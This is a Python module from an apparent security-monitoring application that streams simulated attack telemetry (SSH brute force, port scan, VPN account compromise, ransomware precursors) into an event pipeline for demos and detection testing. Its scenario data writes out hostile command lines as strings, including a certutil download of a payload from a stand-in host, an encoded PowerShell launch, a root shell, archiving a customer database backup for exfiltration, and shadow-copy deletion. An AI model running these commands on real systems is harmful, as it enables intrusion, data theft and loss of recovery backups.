import asyncio
import uuid
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, Optional, List

from app.services.collectors.base_collector import BaseCollector
from app.schemas.event import SecurityEventCreate
from app.database import SessionLocal
from app.services.ingestion_service import normalize_and_ingest_events

class LiveDemoStreamCollector(BaseCollector):
    def __init__(self, collector_id: str = "collector-demo-stream"):
        super().__init__(
            collector_id=collector_id,
            name="Demo Attack Simulator Stream",
            collector_type="DEMO_STREAM"
        )
        self.stream_task: Optional[asyncio.Task] = None
        self.is_paused: bool = False
        self.current_scenario: str = "scenario_1"
        self.rate_per_second: float = 1.0  # Events per second
        self.stream_history: List[Dict[str, Any]] = []

    async def start(self):
        # Default start idle
        self.is_running = True

    async def stop(self):
        await self.stop_stream()
        self.is_running = False

    async def start_stream(self, scenario: str = "scenario_1", rate: float = 1.0):
        await self.stop_stream()
        self.current_scenario = scenario
        self.rate_per_second = max(0.2, min(5.0, rate))
        self.is_running = True
        self.is_paused = False
        self.stream_task = asyncio.create_task(self._stream_loop())
        print(f"[{self.collector_id}] Started continuous demo stream: {scenario} @ {rate} eps")

    async def pause_stream(self):
        self.is_paused = True

    async def resume_stream(self):
        self.is_paused = False

    async def stop_stream(self):
        self.is_paused = False
        if self.stream_task:
            self.stream_task.cancel()
            try:
                await self.stream_task
            except asyncio.CancelledError:
                pass
            self.stream_task = None
        print(f"[{self.collector_id}] Stopped demo stream.")

    async def _stream_loop(self):
        events_catalog = self._generate_scenario_events(self.current_scenario)
        interval = 1.0 / self.rate_per_second

        while self.is_running:
            for item in events_catalog:
                while self.is_paused:
                    await asyncio.sleep(0.5)

                # Clone and set live timestamp
                now = datetime.now(timezone.utc)
                evt = SecurityEventCreate(
                    event_id=f"EVT-STREAM-{uuid.uuid4().hex[:6].upper()}",
                    event_type=item["event_type"],
                    severity=item["severity"],
                    timestamp=now,
                    source_ip=item.get("source_ip"),
                    destination_ip=item.get("destination_ip"),
                    source_port=item.get("source_port"),
                    destination_port=item.get("destination_port"),
                    protocol=item.get("protocol", "TCP"),
                    username=item.get("username"),
                    host=item.get("host"),
                    process_name=item.get("process_name"),
                    command_line=item.get("command_line"),
                    file_path=item.get("file_path"),
                    file_action=item.get("file_action"),
                    source_type="DEMO_STREAM",
                    source_identifier=f"scenario:{self.current_scenario}",
                    is_simulated=True,
                    raw_payload=item.get("raw_payload", "Live simulated telemetry stream")
                )

                db = SessionLocal()
                try:
                    res, saved = normalize_and_ingest_events(db, [evt], auto_queue=True)
                    self.total_received += 1
                    self.total_processed += len(saved)
                    self.last_event_at = now
                    
                    self.stream_history.append({
                        "event_id": evt.event_id,
                        "scenario": self.current_scenario,
                        "event_type": evt.event_type,
                        "timestamp": now.isoformat(),
                        "summary": evt.command_line or evt.file_action or evt.event_type
                    })
                    if len(self.stream_history) > 50:
                        self.stream_history.pop(0)
                except Exception as e:
                    self.error_count += 1
                    self.error_message = str(e)
                finally:
                    db.close()

                await asyncio.sleep(interval)

            # Pause briefly between scenario cycles
            await asyncio.sleep(interval * 2)

    def _generate_scenario_events(self, scenario: str) -> List[Dict[str, Any]]:
        if scenario == "scenario_1":
            # Brute force SSH
            return [
                {"event_type": "authentication", "severity": "MEDIUM", "source_ip": "185.220.101.45", "destination_ip": "10.0.1.15", "destination_port": 22, "username": "sarah.connor", "host": "AUTH-SRV-01", "file_action": "FAILED", "command_line": "sshd: Failed password for invalid user sarah.connor"},
                {"event_type": "authentication", "severity": "MEDIUM", "source_ip": "185.220.101.45", "destination_ip": "10.0.1.15", "destination_port": 22, "username": "sarah.connor", "host": "AUTH-SRV-01", "file_action": "FAILED", "command_line": "sshd: Failed password for invalid user sarah.connor"},
                {"event_type": "authentication", "severity": "HIGH", "source_ip": "185.220.101.45", "destination_ip": "10.0.1.15", "destination_port": 22, "username": "sarah.connor", "host": "AUTH-SRV-01", "file_action": "FAILED", "command_line": "sshd: Failed password attempt 3"},
                {"event_type": "authentication", "severity": "HIGH", "source_ip": "185.220.101.45", "destination_ip": "10.0.1.15", "destination_port": 22, "username": "sarah.connor", "host": "AUTH-SRV-01", "file_action": "FAILED", "command_line": "sshd: PAM-AUTH-FAIL threshold exceeded"},
            ]
        elif scenario == "scenario_2":
            # Network scan
            ports = [21, 22, 80, 443, 445, 1433, 3389, 8080]
            return [
                {"event_type": "network_connection", "severity": "MEDIUM" if p in [80, 443] else "HIGH", "source_ip": "192.0.2.144", "destination_ip": "10.0.1.50", "destination_port": p, "host": "WEB-PROD-01", "command_line": f"TCP SYN probe targeting port {p}"}
                for p in ports
            ]
        elif scenario == "scenario_3":
            # Account compromise & data staging
            return [
                {"event_type": "authentication", "severity": "MEDIUM", "source_ip": "198.51.100.23", "destination_ip": "10.0.1.20", "username": "vikram.sharma", "host": "VPN-GW-01", "file_action": "FAILED", "command_line": "Failed password attempt via VPN Portal"},
                {"event_type": "authentication", "severity": "CRITICAL", "source_ip": "198.51.100.23", "destination_ip": "10.0.1.20", "username": "vikram.sharma", "host": "VPN-GW-01", "file_action": "SUCCESS_POST_BURST", "command_line": "Successful VPN session post-burst"},
                {"event_type": "privilege_escalation", "severity": "CRITICAL", "source_ip": "198.51.100.23", "username": "vikram.sharma", "host": "DB-FIN-01", "command_line": "sudo -u root bash -i"},
                {"event_type": "file_access", "severity": "HIGH", "username": "vikram.sharma", "host": "DB-FIN-01", "file_path": "/var/backups/customers_backup.sql", "command_line": "tar -czf /tmp/exfil.tar.gz /var/backups/customers_backup.sql"}
            ]
        elif scenario == "scenario_4":
            # LOLBin & Ransomware Shadow copy deletion
            return [
                {"event_type": "process_execution", "severity": "HIGH", "username": "local_admin", "host": "WS-DEV-108", "process_name": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f https://update-service-cloud.xyz/payload.bin C:\\Windows\\Temp\\loader.exe"},
                {"event_type": "process_execution", "severity": "HIGH", "username": "local_admin", "host": "WS-DEV-108", "process_name": "powershell.exe", "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgA..."},
                {"event_type": "process_execution", "severity": "CRITICAL", "username": "local_admin", "host": "WS-DEV-108", "process_name": "vssadmin.exe", "command_line": "vssadmin.exe delete shadows /all /quiet", "file_action": "INHIBIT_SYSTEM_RECOVERY"}
            ]
        else:
            # Normal enterprise baseline
            return [
                {"event_type": "network_connection", "severity": "INFO", "source_ip": "10.0.1.105", "destination_ip": "8.8.8.8", "destination_port": 53, "host": "WS-CORP-01", "command_line": "DNS query lookup"},
                {"event_type": "authentication", "severity": "INFO", "source_ip": "10.0.1.105", "destination_ip": "10.0.1.5", "destination_port": 443, "username": "john.doe", "host": "WS-CORP-01", "file_action": "SUCCESS", "command_line": "Kerberos SSO authentication"},
                {"event_type": "network_connection", "severity": "INFO", "source_ip": "10.0.1.105", "destination_ip": "10.0.1.200", "destination_port": 443, "host": "WS-CORP-01", "command_line": "HTTPS GET /intranet/dashboard"}
            ]

    def get_status(self) -> Dict[str, Any]:
        res = super().get_status()
        res.update({
            "is_paused": self.is_paused,
            "current_scenario": self.current_scenario,
            "rate_per_second": self.rate_per_second,
            "is_streaming": bool(self.stream_task and not self.stream_task.done())
        })
        return res

demo_stream_collector = LiveDemoStreamCollector()
